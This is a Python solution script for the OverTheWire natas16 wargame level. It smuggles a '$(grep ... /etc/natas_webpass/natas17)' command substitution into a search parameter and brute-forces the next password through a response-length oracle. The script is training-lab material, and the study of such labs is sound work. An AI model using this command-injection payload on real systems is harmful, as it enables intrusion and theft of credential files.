import requests
import string

letters = "".join([string.ascii_letters, string.digits])
url = "http://natas16.natas.labs.overthewire.org"
natas16_username = "natas16"
natas16_password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"


def brute_force_password():
    password = ""
    while len(password) < 32:
        for c in letters:
            test = '$(grep -E ^' + password + c + \
                '.* /etc/natas_webpass/natas17)'
            uri = url + '?needle=' + test + '&submit=Search'
            resp = requests.get(uri, auth=(natas16_username, natas16_password))
            if len(resp.text) == 1105:
                password += c
                break
    return password


if __name__ == "__main__":
    password = brute_force_password()
    print(password)
